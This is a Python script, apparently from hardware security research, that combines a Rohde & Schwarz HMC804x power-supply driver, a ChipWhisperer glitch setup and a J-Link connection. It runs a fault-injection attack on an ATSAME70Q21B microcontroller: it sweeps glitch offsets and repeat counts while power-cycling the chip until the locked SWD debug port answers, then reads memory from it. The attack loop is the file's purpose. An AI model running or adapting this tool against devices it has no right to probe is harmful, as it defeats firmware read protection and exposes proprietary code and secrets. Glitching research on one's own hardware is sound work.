import time
import pylink
import chipwhisperer as cw
from pyvisa import ResourceManager
from pandas import DataFrame


# Class for setting up the connection of the Supply power
class HMC804x:
    """
    Rohde & Schwarz HMC8041 device is initiatied with a vxi connection, and is used to read power supply values. A 
    """

    #-----------------------------------
    def __init__(self, address, resource_manager, name_line, raw=False):
        
        # IP and connecting
        # Ip address might be different for other devices, see the HMC804x SCPI manual
        if raw:
            address_tcpip = f"TCPIP::{address}::5025::SOCKET"
        else:
            address_tcpip = f"TCPIP0::{address}::inst0::INSTR"
    
        self.instrument = resource_manager.open_resource(address_tcpip)

        # NAMING
        # Device name, dataframe column names,
        self.query_id = self.get_query_id()
        self.device_name = self.query_id[14:21]
        self.mult_channel = int(self.device_name[-1])   # The last number of the device name is the amount of channels
        self.name_line = name_line
        self.column_names = self.define_column_names()
        
        # DATA
        # Data list, request string for data
        self.data = []
        self.data_request_string = "MEAS:SCAL:VOLT?;\n;MEAS:SCAL:CURR?;\n;MEAS:SCAL:POW?;\n;MEAS:SCAL:ENER?"
        
        # SETUP 
        # Energy reset and channel selection
        self.enable_reset_energy_meas()
        self.select_channel(1)                          # preset channel to 1 at start

    #-----------------------------------
    #           QUERY
    #-----------------------------------
    def get_query_id(self):
        """Retrieve the IDN from the device"""
        query = "*IDN?"
        response = self.instrument.query(query).strip('\n')
        return response

    #-----------------------------------
    def query(self, query):
        """Simply performs query"""
        value = self.instrument.query(query)
        return value

    #-----------------------------------
    #       SETTING UP
    #-----------------------------------

    #-----------------------------------
    def enable_reset_energy_meas(self):
        """Turns on and resets the energy measurement
        Page 39 of HMC804x SCPI manual"""
        
        # Loop over all channels
        for channel_number in range(1, self.mult_channel+1):
            
            self.select_channel(channel_number)                 # Select the channel
            
            # Turn on measurement
            query = "MEAS:ENER:STAT ON;*OPC?"
            response = int(self.instrument.query(query)[0])
            

            # Reset if possible
            if response == 1:
                query = "MEAS:ENER:RES;*OPC?"
                response = self.instrument.query(query)
                
            else:
                raise Exception("Energy measurement could not be turned on")
        

        #query = "OUTPut ON?"
  
    #-----------------------------------
    def select_channel(self, channel_number):
        """Selects the channel, in case there are more than 1"""
        if self.mult_channel > 1:

            query = f"INST:NSEL {channel_number}"
            self.instrument.write(query)

        else:
            pass # Command does not work for single channeled HMC8041, so pass

    
    #-----------------------------------
    #       READING DATA
    #-----------------------------------
    # Page 38 of HMC804XSCPI manual
    def read_voltage(self):
        """Reads voltage from previously selected channel"""
        query = 'MEAS:SCAL:VOLT?'
        value = self.instrument.query(query)
        return value

    #-----------------------------------
    def read_current(self):
        """Reads current from previously selected channel"""
        query = 'MEAS:SCAL:CURR?'
        value = self.instrument.query(query)
        return value

    #-----------------------------------
    def read_power(self):
        """Reads power from previously selected channel"""
        query = 'MEAS:SCAL:POW?'
        value = self.instrument.query(query)
        return value
    
    #-----------------------------------
    def read_energy(self):
        """Reads energy from previously selected channel since it was resetted"""
        # Must be turned on first!
        query = 'MEAS:SCAL:ENER?'
        value = self.instrument.query(query)
        return value

    #-----------------------------------
    def read_measurement_values(self):
        """Faster way of reading all measurement data, with one request.
        Read all the measurement values at the same time, using the self.data_request_string 
        formatted in __init__.
        Returns a list in the form of four strings containing the values of ['V', 'I', 'W','Ws'] """

        response = self.instrument.query(self.data_request_string)
        list_volt_curr_pow_ener = response.strip('\n').split('\n')
        return list_volt_curr_pow_ener

    #-----------------------------------
    #       FORMATTING DATA
    #-----------------------------------
    def append_measurement_values(self):
        """Perform measurement and format add to the data list, can be used easily
        in a loop."""

        values_all_channels = []    # All measurements

        # Loop over all channel numbers
        for channel_number in range(1, self.mult_channel+1):
            self.select_channel(channel_number)                 # Select the channel
            
            values = self.read_measurement_values()             # Read all values of channel
            values_all_channels.extend(values)                  # Add these to the list of all value

            
        self.data.append(values_all_channels)
        return values_all_channels

    #-----------------------------------
    def add_data_to_df(self):
        """Add all the measured data to a dataframe."""
        df = DataFrame(self.data, columns=self.column_names)
        return df

    #-----------------------------------
    def define_column_names(self):
        """Defines column names for the dataframe that can be made"""
        # Loop over all channel numbers
        col_names = []
        for channel_number in range(1, self.mult_channel+1):
            col_name = [f"{self.device_name} - {self.name_line} - CH{channel_number} Voltage [V]", 
                        f"{self.device_name} - {self.name_line} - CH{channel_number} Current [A]", 
                        f"{self.device_name} - {self.name_line} - CH{channel_number} Power [W]", 
                        f"{self.device_name} - {self.name_line} - CH{channel_number} Energy since inception [J]"]
            col_names.extend(col_name)
        return col_names

    def Turn_ON_CHANNEL_1(self):
        self.select_channel(1) 
        query = "OUTPut ON"
        response = self.instrument.write(query)
        print("Turn ON CHANNEL 1....")
        
    def Turn_OFF_CHANNEL_1(self):
        self.select_channel(1) 
        query = "OUTPut OFF"
        response = self.instrument.write(query)
        print("Turn OFF CHANNEL 1....")
    
    def Turn_ON_CHANNEL_2(self):
        self.select_channel(2) 
        query = "OUTPut ON"
        response = self.instrument.write(query)
        print("Turn ON CHANNEL 2....")
        
    def Turn_OFF_CHANNEL_2(self):
        self.select_channel(2) 
        query = "OUTPut OFF"
        response = self.instrument.write(query)
        print("Turn OFF CHANNEL 2....")        

# Setup function of the CW
def setup_scope():
    scope.clock.clkgen_freq = 100E6 #The clock of CHPW will be 100MHz
    scope.clock.adc_src = "clkgen_x1"
    scope.clock.freq_ctr_src = "clkgen"
    scope.adc.basic_mode = "rising_edge"
    #scope.io.tio1 = "serial_tx"
    #scope.io.tio2 = "serial_rx"
    scope.clock.reset_dcms()

def setup_glitch():
    scope.glitch.clk_src = "clkgen" 
    scope.glitch.output = "enable_only"  
    scope.trigger.triggers = "tio3"
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_hp = True
    scope.io.glitch_lp = True
    #scope.glitch.resetDcms()

try:
    rm = ResourceManager()
    ip_pow_hmc = "169.254.5.177" # ip of the supply power
    hmc8042 = HMC804x(ip_pow_hmc, rm, name_line="3V3")   # 1 channel HMC
    hmc8042.Turn_OFF_CHANNEL_1()
except Exception as e:
    print("Error in HMC8042 ...!")
    rm.close()    

scope = cw.scope()
scope.default_setup()
target = cw.target(scope)

#Open Jlink with SWD interface
jlink = pylink.JLink()
jlink.open(112233445566)  # S/N of the JLink  
print("JLink product name?")
print(jlink.product_name)
jlink.oem
print("JLink is open?")
print(jlink.opened())
print("JLink is connected?")
print(jlink.connected())
print("SWD what?")
print(jlink.set_tif(pylink.enums.JLinkInterfaces.SWD))

#function to check if the SWD of SAM is open or not
def check_swd():
    try:
        time.sleep(0.5)
        jlink.connect('ATSAME70Q21B', verbose=True)
        unlocked_flag = 1
        print(hex(jlink.core_id()))
        
    except Exception  as e:
        unlocked_flag = 0
        print(e)
        print("LOCKED....")
        
    return unlocked_flag

setup_scope()

unlocked_flag = 0
while True:
   
    what_do_you_want = input("Please enter command: \n \
        (1) Check if it's open or not from SWD        \n \
        (2) Start the Glitch with SWD check          \n \
        (p) Power ON/OFF \n ")
    
    if (what_do_you_want == "1"):
        hmc8042.Turn_ON_CHANNEL_1()
        check_swd()
    
    elif (what_do_you_want == "2"):
        ''' Here we will glitch and check SWD '''
        unlocked_flag = 0
        setup_glitch()
        first_offset = input("Please enter first offset:") # in my case is 80000
        second_offset = input("Please enter second offset:") # in my case is 90000
        for offset in range(int(first_offset), int(second_offset), 1):
            for repeat in range(140, 200, 10):
                if(unlocked_flag == 1):
                    print("UNLOCKED in offset is = ", offset) 
                    print("UNLOCKED in repeat is = ", repeat) 
                    break
                else:
                    time.sleep(0.5)
                    print("The offset is = ", offset)
                    print("The repeat is = ", repeat)   
                    scope.glitch.ext_offset = offset
                    scope.glitch.repeat = repeat  
                    print("S1 = ", scope.adc.state)
                    hmc8042.Turn_OFF_CHANNEL_1()
                    scope.arm()
                    time.sleep(0.5)
                    hmc8042.Turn_ON_CHANNEL_1()
                    unlocked_flag = check_swd()
                    print("S2 = ", scope.adc.state)
            if(unlocked_flag == 1):
                hexlist = jlink.memory_read32(0,10) # Just for example to read the memory first parameter is the address and the second is the size
                printlist = [hex(x)[2:] for x in hexlist]
                print(printlist)        
                break   
    
    elif (what_do_you_want == "p"):
        hmc8042.Turn_ON_CHANNEL_1()  
        time.sleep(0.05)
        hmc8042.Turn_OFF_CHANNEL_1()                 
